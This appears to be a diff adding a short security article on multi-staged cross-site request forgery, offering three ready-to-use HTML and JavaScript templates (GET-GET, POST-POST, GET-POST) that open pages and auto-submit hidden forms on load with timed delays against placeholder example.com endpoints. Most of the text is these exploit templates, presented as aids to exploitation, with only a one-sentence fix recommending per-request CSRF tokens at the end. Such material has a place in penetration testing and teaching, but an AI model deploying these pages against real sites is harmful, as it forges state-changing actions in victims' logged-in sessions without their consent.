@@ -1,0 +1,83 @@
+
+Multi-Staged/Multi-Form CSRF
+
+
+By Deepak Choudhary.
+
+Exploiting a CSRF vulnerability that relies on a single request (GET/POST) is often a simple task, and tools like Burp make effort even easier. However, exploitation can become much more difficult when multiple requests are needed to exploit an CSRF vulnerability.
+
+This is common with edit, add, and delete actions on a web page where a user has to confirm a change (e.g. "Are you sure you'd like to...?").
+
+
+
+Multi-staged requests add an add level of complexity since they can be either GET Requests, POST Requests, or a combination of both. This makes it slightly more complicated to exploit in a single click.
+
+The following are a few multi-staged CSRF templates that you can use to aid in exploitation.
+GET-GET Requests
+<html>
+<head>
+<script language="JavaScript">
+function abc()
+{
+window.open("https://www.example.com/first.aspx");
+window.setTimeout( function () { document.forms[0].submit()}, 12000);  
+}
+</script>
+</head>
+<body onload="abc();">
+<form action="https://www.example.com/second.aspx" method="GET">
+      <input type="submit" value="Submit request" />
+    </form>
+</body>
+</html>
+
+
+POST-POST Requests
+<html>
+<body>
+<form id="form1" method="POST" target="_blank" action=" https://www.example.com/first.aspx">
+<input type="hidden" name="test1" value="1">
+<input type="submit" value="form1">
+</form>
+
+<form id="form2" method="POST" target="_blank" action=" https://www.example.com/second.aspx">
+<input type="hidden" name="test2" value="2">
+<input type="submit" value="form2">
+</form>
+
+<script>
+document.getElementById("form1").submit();
+window.setTimeout( function () { document.forms.form2.submit()}, 12000);  
+</script>
+</body>
+</html>
+
+
+GET-POST Requests
+<html>
+<head>
+<script language="JavaScript">
+function abc()
+{
+window.open("https://www.example.com/first.aspx");
+window.setTimeout( function () { document.forms[0].submit()}, 12000);  
+}
+</script>
+</head>
+<body onload="abc();">
+
+<form action=" https://www.example.com/second.aspx" method="POST">
+      <input type="hidden" name="parameter1 name " value="test1" />
+      <input type="hidden" name="parameter2 name" value="test2" />
+      <input type="submit" value="Submit request" />
+    </form>
+</body>
+</html>
+
+
+
+Fixing CSR:
+
+Of course, CSRF token validation will save here. So random token (per request) should be there in every request form and validate at server side.
+
+
